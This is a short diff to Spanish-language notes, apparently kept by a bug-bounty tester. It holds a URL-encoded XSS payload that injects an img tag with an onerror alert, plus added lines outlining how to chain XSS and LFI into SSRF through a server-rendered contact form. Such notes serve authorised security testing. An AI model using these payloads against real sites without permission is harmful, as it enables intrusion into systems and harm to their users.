@@ -1,2 +1,8 @@
 //Esta es la inj desde url que uso para XSS.
 PATH: %22%3E%3Cimg%20src=raw%20onerror=alert(%22hackerone%22)%3E#/
+
+Para hacer un fetch y lograr SSRF desde XSS:
+  > Hace falta encontrar un archivo con posibilidad de hacer LFI.
+  Ejemplo; ejemplo1.md
+  luego se debe encontrar una parte donde el servidor carge el HTML, ejemplo; formulario de contacto. <img src="http://link.com/ejemplo1.md">
+
